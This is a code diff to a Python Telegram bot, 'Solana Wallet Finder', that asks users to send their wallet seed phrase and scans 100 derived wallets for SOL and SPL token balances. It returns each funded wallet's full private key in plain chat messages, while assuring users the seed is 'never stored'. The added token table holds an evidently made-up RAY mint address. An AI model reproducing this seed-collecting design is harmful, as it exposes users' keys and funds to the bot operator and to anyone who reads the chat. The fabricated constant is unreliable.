@@ -3,6 +3,7 @@ import json
 import asyncio
 import logging
 import sys
+import time
 import aiohttp
 from flask import Flask, request
 from telegram import Update
@@ -16,7 +17,6 @@ from datetime import datetime
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 MAX_WALLETS = 100
 PORT = int(os.environ.get('PORT', 10000))
-# Your Render URL - set this in Render environment variables
 RENDER_URL = os.environ.get('RENDER_EXTERNAL_URL', '')
 
 # Multiple RPC endpoints for load balancing
@@ -26,6 +26,18 @@ RPC_ENDPOINTS = [
     "https://rpc.ankr.com/solana",
     "https://solana.publicnode.com",
 ]
+
+# Known token symbols (you can expand this list)
+TOKEN_SYMBOLS = {
+    "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v": "USDC",
+    "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB": "USDT",
+    "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263": "BONK",
+    "So11111111111111111111111111111111111111112": "wSOL",
+    "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So": "mSOL",
+    "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN": "JUP",
+    "RAYJ4K9FnTkn4D6QbKj6P5LvJZf9JqWzXqXqXqXqXqX": "RAY",
+    "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt": "SRM",
+}
 
 # ==================== SETUP LOGGING ====================
 logging.basicConfig(
@@ -38,7 +50,6 @@ logger = logging.getLogger(__name__)
 flask_app = Flask(__name__)
 
 # ==================== TELEGRAM BOT SETUP ====================
-# Important: No updater for webhook mode!
 telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
 user_states = {}
 
@@ -49,8 +60,12 @@ def format_private_key(private_key_bytes):
     json_array = list(private_key_bytes)
     return {'base58': base58_key, 'json_array': json_array}
 
-async def check_balance_async(session, address, endpoint, retry_count=0):
-    """Async balance check with retry logic"""
+def get_token_symbol(mint_address):
+    """Get token symbol from mint address"""
+    return TOKEN_SYMBOLS.get(mint_address, mint_address[:8] + "...")
+
+async def check_sol_balance(session, address, endpoint):
+    """Check SOL balance for an address"""
     try:
         payload = {
             "jsonrpc": "2.0",
@@ -64,22 +79,65 @@ async def check_balance_async(session, address, endpoint, retry_count=0):
                 data = await response.json()
                 if 'result' in data:
                     return data['result']['value'] / 1e9
-            elif response.status == 429 and retry_count < 2:
-                await asyncio.sleep(1)
-                new_endpoint = RPC_ENDPOINTS[(RPC_ENDPOINTS.index(endpoint) + 1) % len(RPC_ENDPOINTS)]
-                return await check_balance_async(session, address, new_endpoint, retry_count + 1)
     except Exception as e:
-        logger.debug(f"Balance check error for {address}: {e}")
-    
+        logger.debug(f"SOL balance check error for {address}: {e}")
     return 0
 
+async def check_spl_tokens(session, address, endpoint):
+    """Check all SPL tokens for an address"""
+    try:
+        payload = {
+            "jsonrpc": "2.0",
+            "id": 1,
+            "method": "getTokenAccountsByOwner",
+            "params": [
+                address,
+                {"programId": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"},
+                {"encoding": "jsonParsed"}
+            ]
+        }
+        
+        async with session.post(endpoint, json=payload, timeout=15) as response:
+            if response.status == 200:
+                data = await response.json()
+                tokens = []
+                
+                if 'result' in data and 'value' in data['result']:
+                    for account in data['result']['value']:
+                        try:
+                            # Parse token account info
+                            parsed = account['account']['data']['parsed']
+                            if parsed['program'] == 'spl-token' and parsed['type'] == 'account':
+                                info = parsed['info']
+                                token_amount = info['tokenAmount']
+                                balance = float(token_amount['uiAmount'])
+                                
+                                if balance > 0:
+                                    mint = info['mint']
+                                    tokens.append({
+                                        'mint': mint,
+                                        'balance': balance,
+                                        'symbol': get_token_symbol(mint),
+                                        'decimals': token_amount['decimals'],
+                                        'token_account': account['pubkey']
+                                    })
+                        except Exception as e:
+                            logger.debug(f"Error parsing token account: {e}")
+                            continue
+                
+                return tokens
+    except Exception as e:
+        logger.debug(f"SPL token check error for {address}: {e}")
+    return []
+
 async def scan_wallets_parallel(seed_phrase, update):
-    """Scan wallets in parallel for maximum speed"""
+    """Scan wallets in parallel for both SOL and SPL tokens"""
     try:
         seed = Bip39SeedGenerator(seed_phrase).Generate()
         
         await update.message.reply_text("🔑 Deriving wallet addresses...")
         
+        # Derive all wallets first
         wallets = []
         for i in range(MAX_WALLETS):
             bip44_mst = Bip44.FromSeed(seed, Bip44Coins.SOLANA)
@@ -96,51 +154,74 @@ async def scan_wallets_parallel(seed_phrase, update):
                 'private_key': private_key
             })
         
-        await update.message.reply_text(f"🔍 Scanning {MAX_WALLETS} wallets with parallel connections...")
+        await update.message.reply_text(f"🔍 Scanning {MAX_WALLETS} wallets for SOL and SPL tokens...")
         
         found_count = 0
-        batch_size = 20
+        batch_size = 10  # Smaller batch size because SPL checks are heavier
         
         async with aiohttp.ClientSession() as session:
             for batch_start in range(0, MAX_WALLETS, batch_size):
                 batch_end = min(batch_start + batch_size, MAX_WALLETS)
                 batch = wallets[batch_start:batch_end]
                 
+                # Create tasks for both SOL and SPL checks
                 tasks = []
                 for wallet in batch:
                     endpoint = RPC_ENDPOINTS[wallet['index'] % len(RPC_ENDPOINTS)]
-                    tasks.append(check_balance_async(session, wallet['address'], endpoint))
+                    tasks.append(asyncio.gather(
+                        check_sol_balance(session, wallet['address'], endpoint),
+                        check_spl_tokens(session, wallet['address'], endpoint)
+                    ))
                 
-                balances = await asyncio.gather(*tasks)
+                # Wait for all checks in batch to complete
+                results = await asyncio.gather(*tasks)
                 
-                batch_found = 0
-                for wallet, balance in zip(batch, balances):
-                    if balance and balance > 0:
+                # Process results
+                for wallet, (sol_balance, spl_tokens) in zip(batch, results):
+                    has_funds = sol_balance > 0 or len(spl_tokens) > 0
+                    
+                    if has_funds:
                         found_count += 1
-                        batch_found += 1
-                        logger.info(f"Found wallet {wallet['index']} with {balance} SOL")
+                        logger.info(f"Found wallet {wallet['index']} with SOL: {sol_balance}, Tokens: {len(spl_tokens)}")
                         
-                        # ===== FIXED PRIVATE KEY FORMAT =====
-                        # Get the complete Base58 key (no truncation)
-                        base58_key = wallet['private_key']['base58']
+                        # Build comprehensive message
+                        message = f"🎉 *WALLET WITH FUNDS FOUND!*\n\n"
+                        message += f"📌 *Account Index:* `{wallet['index']}`\n"
+                        message += f"📬 *Address:* `{wallet['address']}`\n"
+                        message += f"💰 *SOL Balance:* `{sol_balance:.6f} SOL`\n"
                         
-                        # Send wallet found message with clear import instructions
-                        await update.message.reply_text(
-                            f"🎉 *WALLET WITH FUNDS FOUND!*\n\n"
-                            f"📌 *Account Index:* `{wallet['index']}`\n"
-                            f"📬 *Address:* `{wallet['address']}`\n"
-                            f"💰 *Balance:* `{balance:.6f} SOL`\n\n"
-                            f"*📥 HOW TO IMPORT INTO PHANTOM:*\n"
-                            f"1. Copy the Base58 key below (the whole long string)\n"
-                            f"2. Open Phantom → Click profile icon → Add Account\n"
-                            f"3. Select *Import Private Key* (NOT Recovery Phrase)\n"
-                            f"4. Paste the key and click Import\n\n"
-                            f"🔐 *BASE58 PRIVATE KEY (USE THIS FOR PHANTOM):*\n"
-                            f"`{base58_key}`\n\n"
-                            f"*(Alternative format - JSON array, if needed)*\n"
-                            f"`{wallet['private_key']['json_array']}`",
-                            parse_mode='Markdown'
-                        )
+                        if spl_tokens:
+                            message += f"\n🪙 *SPL Tokens:*\n"
+                            for token in spl_tokens:
+                                message += f"• *{token['symbol']}*: `{token['balance']}` (Mint: `{token['mint'][:8]}...`)\n"
+                        
+                        message += f"\n*📥 HOW TO IMPORT INTO PHANTOM:*\n"
+                        message += f"1. Copy the Base58 key below\n"
+                        message += f"2. Open Phantom → Add Account → Import Private Key\n"
+                        message += f"3. Paste the key and click Import\n\n"
+                        message += f"🔐 *BASE58 PRIVATE KEY:*\n"
+                        message += f"`{wallet['private_key']['base58']}`\n\n"
+                        message += f"*(JSON format if needed)*\n"
+                        message += f"`{wallet['private_key']['json_array']}`"
+                        
+                        # Send message (split if too long)
+                        if len(message) > 4000:
+                            # Send summary first
+                            await update.message.reply_text(
+                                f"🎉 *WALLET WITH FUNDS FOUND!*\n\n"
+                                f"📌 Index: `{wallet['index']}`\n"
+                                f"💰 SOL: `{sol_balance:.6f}`\n"
+                                f"🪙 Tokens: {len(spl_tokens)}",
+                                parse_mode='Markdown'
+                            )
+                            # Send private key separately
+                            await update.message.reply_text(
+                                f"🔐 *BASE58 PRIVATE KEY:*\n"
+                                f"`{wallet['private_key']['base58']}`",
+                                parse_mode='Markdown'
+                            )
+                        else:
+                            await update.message.reply_text(message, parse_mode='Markdown')
                 
                 # Send progress update
                 await update.message.reply_text(
@@ -161,16 +242,19 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "👋 *Welcome to Solana Wallet Finder!*\n\n"
         "This bot helps you recover wallets from your seed phrase.\n\n"
+        "*Features:*\n"
+        f"• Scans {MAX_WALLETS} wallets\n"
+        "• Checks **SOL balance**\n"
+        "• Checks **ALL SPL tokens** (USDC, USDT, BONK, etc.)\n"
+        "• Parallel scanning for speed\n\n"
         "*Commands:*\n"
-        "/scan - Start scanning for wallets\n"
+        "/scan - Start scanning\n"
         "/cancel - Cancel current operation\n\n"
         "*📥 HOW TO IMPORT FOUND WALLETS:*\n"
-        "When a wallet is found, copy the Base58 private key and:\n"
-        "1. Open Phantom wallet\n"
-        "2. Click profile icon → Add Account\n"
-        "3. Select *Import Private Key* (NOT Recovery Phrase)\n"
-        "4. Paste the key and click Import\n\n"
-        "⚠️ *Security:* Your seed phrase is only used temporarily.",
+        "1. Copy the Base58 private key\n"
+        "2. Open Phantom → Add Account → Import Private Key\n"
+        "3. Paste the key and click Import\n\n"
+        "⚠️ *Security:* Your seed phrase is never stored.",
         parse_mode='Markdown'
     )
 
@@ -181,8 +265,10 @@ async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logger.info(f"Scan command from chat {chat_id}")
     await update.message.reply_text(
         f"📝 *Please send your 12 or 24-word seed phrase:*\n\n"
-        f"I'll scan the first {MAX_WALLETS} wallets at high speed.\n\n"
-        f"⚠️ *Important:* Make sure to copy the full Base58 key when wallets are found!",
+        f"I'll scan the first {MAX_WALLETS} wallets for:\n"
+        f"• SOL balance\n"
+        f"• All SPL tokens (USDC, USDT, BONK, etc.)\n\n"
+        f"This may take 20-30 seconds.",
         parse_mode='Markdown'
     )
 
@@ -203,11 +289,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if chat_id in user_states and user_states[chat_id].get('awaiting_seed'):
         logger.info(f"Received seed phrase from chat {chat_id}")
-        await update.message.reply_text("✅ Seed phrase received. Starting high-speed scan...")
+        await update.message.reply_text("✅ Seed phrase received. Starting comprehensive scan...")
         
         try:
             # Start timing
-            import time
             start_time = time.time()
             
             # Run the parallel scan
@@ -221,7 +306,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"• Wallets scanned: {MAX_WALLETS}\n"
                 f"• Wallets with funds: {found_count}\n"
                 f"• Time taken: {elapsed_time:.1f} seconds\n\n"
-                f"*Remember:* Use the Base58 private key to import into Phantom!",
+                f"*Remember:* Check each found wallet for SOL and SPL tokens!",
                 parse_mode='Markdown'
             )
             logger.info(f"Scan complete for chat {chat_id}, found {found_count} wallets in {elapsed_time:.1f}s")
@@ -276,20 +361,24 @@ async def setup_webhook():
     if RENDER_URL:
         webhook_url = f"{RENDER_URL}/webhook"
         try:
+            # Delete any existing webhook first
+            await telegram_app.bot.delete_webhook()
+            # Set new webhook
             await telegram_app.bot.set_webhook(url=webhook_url)
-            logger.info(f"Webhook set to {webhook_url}")
+            logger.info(f"✅ Webhook set to {webhook_url}")
         except Exception as e:
-            logger.error(f"Failed to set webhook: {e}")
+            logger.error(f"❌ Failed to set webhook: {e}")
 
 # ==================== MAIN ====================
 if __name__ == "__main__":
-    logger.info("🚀 Starting Solana Wallet Finder Bot with webhook...")
+    logger.info("🚀 Starting Solana Wallet Finder Bot with SPL token support...")
     logger.info(f"📊 Will scan {MAX_WALLETS} wallets per request")
     logger.info(f"🌐 Using {len(RPC_ENDPOINTS)} RPC endpoints for load balancing")
+    logger.info(f"🪙 Tracking {len(TOKEN_SYMBOLS)} known SPL tokens")
     logger.info(f"🤖 Bot token exists: {bool(BOT_TOKEN)}")
     
     # Set webhook asynchronously
     asyncio.run(setup_webhook())
     
-    # Run Flask app (this blocks)
+    # Run Flask app
     flask_app.run(host='0.0.0.0', port=PORT)
